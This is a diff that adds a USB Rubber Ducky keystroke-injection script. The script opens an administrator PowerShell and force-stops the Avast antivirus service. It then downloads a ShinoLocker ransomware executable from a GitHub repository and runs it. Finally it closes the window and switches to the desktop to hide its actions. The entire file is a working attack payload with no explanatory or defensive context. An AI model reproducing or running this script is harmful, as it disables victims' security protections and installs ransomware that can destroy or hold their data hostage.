@@ -1,0 +1,31 @@
+DELAY 300
+GUI s
+DELAY 300
+STRING powershell
+DELAY 500
+CTRL-SHIFT ENTER
+DELAY 500
+STRING get-service
+ENTER
+DELAY 750
+STRING stop-service -force "avast! antivirus"
+ENTER
+DELAY 1000
+ENTER
+DELAY 500
+STRING get-service "avast! antivirus"
+ENTER
+DELAY 1000
+STRING Invoke-WebRequest -Uri "https://github.com/blackslash-wht/Rubber-Ducky-Install-Ransomware/raw/master/ShinoLocker_MSWindowsBuild.exe" -OutFile "c:\Temp\sl.exe"
+DELAY 500
+ENTER
+DELAY 3000
+STRING c:\Temp\sl.exe
+DELAY 500
+ENTER
+ALT F4
+DELAY 100
+STRING exit
+DELAY 100
+ENTER
+GUI d
